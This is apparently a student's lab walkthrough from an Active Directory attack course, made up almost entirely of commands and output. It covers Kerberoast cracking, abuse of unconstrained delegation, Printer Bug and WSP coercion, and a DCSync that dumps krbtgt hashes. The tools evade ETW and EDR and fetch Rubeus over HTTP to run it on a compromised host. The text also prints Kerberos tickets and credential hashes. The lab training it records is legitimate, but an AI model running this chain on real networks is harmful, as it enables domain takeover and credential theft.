4F1F77016DB94E03F4B5B2595E22B72D3520B1147A04C3D8DE86C60600A5BB1ED6CC1F07A57FA2D3B6ECA70DB7FE010FCFADCF617AADEC53D9E0B299992EACB463FBE89FC6BA4AFDE1207FE8ACE585B87CC30666F78377854095385DDD835506ADE8AD5FA28E5E1E5F49260275A9ECC7E66FDA69921EDA0E469A5C841EA8A842DA1FE52A92683DAEBB9933725846193784E156D5D6C15FF29FA72206F2198748D63F67AFDD5CA99BB68AFDA93F9C4879CB74F3FC24C3D3879E4A44CC1864A2F32CF99F556E7683FF80205B7B95BA2175E2CF1C3CC2A8B84619EE7A66B5123CF89BCB963BCAB6442ECD13331912495539CC735C88185144D5042C71F341BADAE70E6E8A162FB96F02259EF3859A57D70DDBAE126CE84A64A9423702216534DFFA8FDD825E8FEF0A73B23AF9761ABB7491413836A36C23F037CCE544505D01D17BF8F7BD1253BBF2405D7D6C512F1434E2E1ABC386B518FD400341DF6A17CA176ED9E50A69AD29DA276D20FD082DD7C9AEDDA8851F38349B80CEB1FF4F274F1E30216FAA1DE0149931570A3A24BB3FCFB7817
```

### We can now use John the Ripper to brute-force the hashes. Please note that you need to remove ":1433" from the SPN in hashes.txt before running John

```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*$C18A29F02C25C2DDCF25F809804D86B7$4A94FA3E6D84B69D18721F2E8908AB08CFFC1E7A2D6DE488752123E9E5957A13B47308CCE53D7796F0C1138CC320C2CBE1FE9C4F431EC5FAB35DC42F8DE1C180B8BFA990D7857BCA1445D216368037DD4047D60D26837FDCA597A21A57898F06D24730FB9B47C5EFF27F723A32CD66EA3523D2CF89148843E4EB4D10FF968C9198129A36E85C0E0F79CBDC3CA80E788A68B204F0076F61AF2C14F79EE0E68AC609BCF3079BE4FF489B69860D45C753299BE5F457AC2FCFB88C3F2E4BB2F3A280CF705CAA85645BB3DCE08068B31A0440B5D242B7453579FD9DBC0AF735F14541E489111CC4202B6AD80B54D9B4B9EEA9FEC87D9FC6ABAF8976CFF5FF58F7B2847105FF3DB29DBA39E18A1384BEBB11488E5D2E60696BB787099A6426933198C4DAD238C3C9912D2E463139114706D1A53F6085FE19D7AA5D824CB1A1DC4E6FADB755285C32A1AD4D8108F97FD013DC17997BA746A2A5393B400BA1AA817B013C36BF4253FE8D8C0E6F23A365A3F2EAD80FCBC6A20AB6390C22DA16651778D8E21734E65698C5B248AB1D131C72F54B4446D298AA2AF36A74AAFB06DA038AE3FAA0A7841D5546E2E0F9D817D5E8A79D1AECDA8D404F992686BDA059B6D051E62AF1840756F30A381DEF52976204179EC4E35EB2919B533D72230F5D32AE0B104224EE2786F3F576A5210F8BE4B06A0A38468466A525292216949A443044EB66F63955120445CD32E0B3339F1CB3199D2A0B026BD8CD1627F1E758EEEFD8EEC80CC6204766DF21CC610503AE5E10996597C46F5C332B83CB8B840095ECCAAEE5DDB31E1D39ACEB9E0DED769855E64F94AC5A07C5B4F47B4DFB7EC188CD6FF3896D224E67D350E06225A088D6826CA286E869CDE016EE80967BF6F157A3B1B9CDB69DA15EA9BEE054166CAE02D8EF734E51460BBE209B6E6EB011EED29BCC3458F7E8DDF368B08B2605A2D6F38A47777447E395053CB2FAF9C01EA038E219BB8AE78B7FEC8D3EE427AEF05BA4B159C89E306D8FDA53EB82233461A16816A40AD1444EB54E800051C40FA261CC24E84792C7BE0DB962CD5FAB22750C9AF273734439824F50D7FFD72FF5A82C22F4F1F77016DB94E03F4B5B2595E22B72D3520B1147A04C3D8DE86C60600A5BB1ED6CC1F07A57FA2D3B6ECA70DB7FE010FCFADCF617AADEC53D9E0B299992EACB463FBE89FC6BA4AFDE1207FE8ACE585B87CC30666F78377854095385DDD835506ADE8AD5FA28E5E1E5F49260275A9ECC7E66FDA69921EDA0E469A5C841EA8A842DA1FE52A92683DAEBB9933725846193784E156D5D6C15FF29FA72206F2198748D63F67AFDD5CA99BB68AFDA93F9C4879CB74F3FC24C3D3879E4A44CC1864A2F32CF99F556E7683FF80205B7B95BA2175E2CF1C3CC2A8B84619EE7A66B5123CF89BCB963BCAB6442ECD13331912495539CC735C88185144D5042C71F341BADAE70E6E8A162FB96F02259EF3859A57D70DDBAE126CE84A64A9423702216534DFFA8FDD825E8FEF0A73B23AF9761ABB7491413836A36C23F037CCE544505D01D17BF8F7BD1253BBF2405D7D6C512F1434E2E1ABC386B518FD400341DF6A17CA176ED9E50A69AD29DA276D20FD082DD7C9AEDDA8851F38349B80CEB1FF4F274F1E30216FAA1DE0149931570A3A24BB3FCFB7817
```

* C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!! (?)
1g 0:00:00:00 DONE (2025-09-28 08:58) 27.02g/s 55351p/s 55351c/s 55351C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Learning Objective 15:
```
• Find a server in the dcorp domain where Unconstrained Delegation is enabled. 
• Compromise the server and escalate to Domain Admin privileges. 
• Escalate to Enterprise Admins privileges by abusing Printer Bug!
```

### First, we need to find a server that has unconstrained delegation enabled

* C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1
* PS C:\AD\Tools> Get-DomainComputer -Unconstrained | select -ExpandProperty name

```
DCORP-DC
DCORP-APPSRV
```

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. 
Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let’s check if anyone of them have local admin privileges on dcorp-appsrv.

### First, we will try with appadmin. Run the below command from an elevated command prompt

* C:\Windows\System32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
[*] Action: Ask TGT

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : SP5SI1I0
[*] Domain          : N395QGVS
[*] Password        : FHF8B5ZT
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1508
[+] LUID            : 0xac119c

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALappadmin
[*] Using aes256_cts_hmac_sha1 hash: 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\appadmin'
[*] Target LUID : 11276700
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[*] Target LUID: 0xac119c
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  appadmin (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  9/28/2025 9:29:33 AM
  EndTime                  :  9/28/2025 7:29:33 PM
  RenewTill                :  10/5/2025 9:29:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  N6hGzSy9QX1I/2T9A8gG3ax6TbV8iMq480g/euJ3OT0=
  ASREP (key)              :  68F08715061E4D0790E71B1245BF20B023D08822D2DF85BFF50A0E8136FFE4CB
```

### In the new proccess run

* C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local

```
dcorp-appsrv
dcorp-adminsrv
```

### We now have admin access to the machine that has unconstrained delegation

### Run the below command from the process running appadmin

* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```
Does \\dcorp-appsrv\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

* C:\Windows\system32> winrs -r:dcorp-appsrv cmd
* C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31
* C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
* C:\Users\appadmin>C:\Users\Public\Loader.exe -path http://172.16.100.31/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://172.16.100.31/Rubeus.exe Arguments : monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

### Use the Printer Bug for Coercion
On the student VM, use MS-RPRN to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required).

* C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

### On the Rubeus listener, we can see the TGT of dcorp-dc$

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://172.16.100.31/Rubeus.exe Arguments : monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs


[*] 9/28/2025 4:44:44 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  9/28/2025 5:02:58 AM
  EndTime               :  9/28/2025 3:01:48 PM
  RenewTill             :  10/5/2025 5:01:48 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSg9/3Tg/ryNDZ/YLXEC1vTk6mzZJF9K4fRalUG2qHA4P/um4gxb+ecXFnwUVQ7qrrER7nTPfpCVy2gMRfiGYjf3oljTguWPhkFqckfj1d0HuK3Rx20N2Mtv8R/Dug0dFZcnwHdnAHd+oPlB/9iwAku/iXDk2DD7h1UcRd1WbLo6SxfmX++UKk7HJ1psj5QAMizUhCB+OjJenWoBTIbAJXE5luWDbzpjyS4TMk0hbb3xA4+490E0w+1cY28wCeKP+YKhl7wk7U8K53SwDtpMPX0We8JwqrJN/ZhucUFCxsXWQxAs7ubYE7/pZK2cKfHi7TiZyZYMFz5INAnGKn8nVNfn7RLXa+tfU8Rml47l/6HWuLsjnfN+EKtbSSlYPqDGvNbXPvogh07Rknq4CoM4edSH6HacGr2zm/j9QqlqgYriU8dnX76wjvsoKC/1Xz+eqjTmtaRKG6xiC+DI3UGgOWl3TYKMOUBRd1OFUzPgEiUsOms3esHVgjZKvvgArA6rJll6OmuCSuMMtAa6SZsfvdOi47u3RYsd1sbITQcrETUHYfaTsk5zYneZDNH+ubPqG7zLwWhTmmsJm+/Cb/4niXxCRnDgpAotbq9+/x62nHXg7YOOBEto/UTKcbzIHmLCMx1nDcZH7UbysPfRq74yPhmjnypRC7TOZs/Ra1TPLN7fydy7A7KCO4ZjzERlWFS74Vw0Hx+auwvAvLhLQ94dXnEB6qdKbTVuP95PTQdQStJkt922Srtmzp/p63krD0xL4Obo69YkIlH+tHnJpgrOHlrMb0mDYAYITpQtfgAEnnO/Y0w3MqIYbs6K9t8Jzjzw3soXoPDkJ2ABJOAF1Ior2OM1gZmRdNi3s8OeSf+Uho4A13GkKFxoHqlURqJCrGmaq4rhatLTpNfqFLsWZGirhfrCDBUxrwDMCeccvr4NMvzMQmdyNBO0CfluWLmn/DgxRdlpTFEMXfjiolFb9Egc8zD34Z3P2LFgQ5qV8mgZlPI+pw1M4EF5T0tnXdDrbH1mDRyRV2R3ZyB32Aq7zmpsSnqf+98Rtykimp31zi/FrkYJ7eOCS+FRXcNCkVawV6L79Ga38uPcPVyVwNP2LRqO/jlxt6Aj5mST+btDRV/UTv/6U40s3RRPUXkTZHNthSCbIUHwqOs9dUzAuEbMAqhmQsIdggRrUTdAcKrX4pjJ1LkptDJ+UU7KHfAjLoRqGgtVVVNmYyqMSHE8gE/o83Eazl+f7ny7o8OHe2VLuX237Wwr8EhF+j/M6u4leNKMTlirXiQxP/47uOo3csyF64Hm+Yyb0ZOqBJYhW3EyuuMq0knFB2mXusKLe/r13qotFYyiOtWYc6SnWqD/ZS3LOr59TITv5hIbbevpRbKcYTeZ6imvbhdM6IC3rOp/StuxvKjSxMGfPmErMaA7oBiOKzGJDIKBn1z83EMNveDFD3CJOqn7CpA3gDm32rFZJig/YywTobrXykLD5zIHKtRCJf5P27229M5iq2Q0M40EGwMgNFsMOEzGyTv5VOmmXWnJtgENbfakp76bJDIh9rfJH3o2iI+YAN+7QzglxnWSezLKe/RwOmjggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIFx8D8nk9Qe2ok+vvnKW/d/tdJpYJUBciLOvbJvEOP1toRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohYwFKADAgEBoQ0wCxsJRENPUlAtREMkowcDBQBgoQAApREYDzIwMjUwOTI4MTIwMjU4WqYRGA8yMDI1MDkyODIyMDE0OFqnERgPMjAyNTEwMDUxMjAxNDhaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==

[*] Ticket cache size: 1
```

Copy the base64 encoded ticket and use it with Rubeus on student VM. 
Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhgg...

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : ptt /ticket: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

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

### Now, we can run DCSync from this process

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\SafetyKatz.exe Arguments : lsadump::evasive-dcsync /user:dcorp\krbtgt exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!
```

### Use the Windows Search Protocol (MS-WSP) for Coercion

We can also use Windows Search Protocol for abusing unconstrained delegation. Please note that the 
Windows Search Service is enabled by default on client machines but not on servers. For the lab, we 
have configured it on the domain controller (Traffic on TCP port 445 from student VM to dcorp-dc and 
dcorp-dc to dcorp-appsrv required). 

Setup Rubeus in monitor mode exactly as we did for the Printer Bug. On the student VM, use the 
following command to force dcorp-dc to connect to dcorp-appsrv

* C:\Users\student731>C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\tools\WSPCoerce.exe Arguments : DCORP-DC DCORP-APPSRV
[+] OleDbException - Error 0x80040718L
[+] Search query successfully sent to the target
```

### Use the Distributed File System Protocol (MS-DFSNM) for Coercion
If the target has DFS Namespaces service running, we can use that too for coercion (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required).

